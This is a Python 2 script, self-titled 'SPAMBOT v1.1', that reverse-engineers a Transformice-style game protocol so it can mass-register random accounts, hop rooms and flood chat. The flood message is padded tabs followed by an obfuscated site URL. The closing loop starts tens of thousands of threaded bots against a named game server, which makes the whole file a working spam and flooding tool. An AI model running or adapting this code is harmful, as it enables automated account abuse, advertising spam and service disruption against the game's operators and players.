from socket import *
from struct import *
import random
import hashlib
import threading
room = ["1", "2"]
#
class PrefixGen:
    def __init__(self, data):
        self.MDT = []
        self.data = data
        self.data = self.data.replace('\x00','')
        message = self.data.split('\x01')
        LCMDT = list(message[2])
        for c in map(int, LCMDT):
            if c == 0: self.MDT.append(chr(10))
            else: self.MDT.append(chr(c))

        self.CMDTEC = int(message[3])

    def __call__(self):
        final = ""
        loc_2 = map(int, list(str(self.CMDTEC%9000 + 1000)))
        final = ''.join([self.MDT[x] for x in loc_2])
        self.CMDTEC += 1
        return final
class spambot(threading.Thread):
	def generateusername(self, length = 10):
		abc = list("abcdefghijklmnopqrstuvwxyz")
		name = ""
		length = "0"*length
		for lengths in length: name +=random.choice(abc)
		return name
	def sendkey(self):
		com = "\x00\x00\x00\x00\x1C\x01\x00\x3a\x00\x0Ajelkyyfcdm\x17\xED\x00bot" 
		self.m.send(pack("!l", len(com)+4)+com)
		kikoo = False
		#kikoo = self.m.recv(4096)
		if not kikoo:d = self.m.recv(4098).split("\x1a\x1b")[1]
                else:d = self.m.recv(8192).split("==")[1].split("\x1a\x1b")[1]
		firstpck = d.split("\x01")
		community = firstpck[4].replace("\x00", "")
		mdt = firstpck[3]
		cmdtec = firstpck[2] 
		online = firstpck[1]
		print "Mice online - %s\nCommunity - %s"%(online, community.upper())
		self.perefix = PrefixGen(d)
		com = self.perefix()+self.PacketCodes["community"]+"\x02"
		self.m.send(pack("!l", len(com)+4)+com)
		print "Community send... True"
	def login(self, type = "Registration"):
		self.type = type
		if self.type == "Registration":
			com = "\x1A\x03\x01%s\x01%s\x01http://devmic.es//Transformice.swf?n=1353411434206"%(self.username, hashlib.sha256(self.settings["password"].encode('utf-8')).hexdigest())
			com = self.perefix()+self.PacketCodes["old"]+pack("!h", len(com))+com
			self.m.send(pack("!l", len(com)+4)+com)
			print "Logging in... True\nRoom [Tutorial]-"+self.username
		print "Type of spam - %s"%(self.type)
	def roomchange(self):
		room = random.choice(self.settings["rooms"])
		com = "\x06\x1A\x01room "+room
		com = self.perefix()+self.PacketCodes["old"]+pack("!h", len(com))+com
		self.m.send(pack("!l", len(com)+4)+com)
		print "New room - %s"%(room)
	def chat(self, message = ""):
		if message == "": message = self.settings["message"]
		com = self.perefix()+self.PacketCodes["chat"]+pack("!h", len(message))+message
		self.m.send(pack("!l", len(com)+4)+com)
	def chatspam(self):
		while self.isSpamming:
			print "Chat Spamming... True"
			self.chat()
			if self.msgs == self.settings["messagelen"]: self.isSpamming = False
			self.msgs +=1
			
		else:
			print "Exit... True"
			self.m.shutdown(0)
	def __init__(self, ip, port):
		self.isSpamming = True
		self.msgs = 0
		self.PacketCodes = {"old":"\x01\x01", "community":"\x0d\x1c", "chat":"\x55\x55"}
		self.settings = {"password":"xdsvmsdsfmjP2agddsDA", "message":"\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09 art\x04m\x04ice.\x04ru/play/index.html", "messagelen":0, "rooms":["1", "2", "vanilla1", "bootcamp1", "survivor1"]}
		print "SPAMBOT v1.1. Copyright Juv1e."
		self.m = socket(AF_INET, SOCK_STREAM)
		print "Creating socket... True"
		address = (ip, port)
		self.m.connect(address)
		print "Connecting socket... True\n[DEBUG] IP %s; Port %s"%(ip, port)
		self.username = self.generateusername()
		print "Username generated... True\n[DEBUG] Username %s"%(self.username)
		print "Sending key... True"
		self.sendkey()
		print "Calling login()... True"
		self.login()
		self.roomchange()
		self.chat()
		threading.Thread.__init__(self)
try:
    for x in xrange ( 200 ):
        for x in xrange ( 20000 ):
            spambot("gol5.zapto.org", 5555).start()
except:
    while True: spambot("gol5.zapto.org", 5555).start()

raw_input()
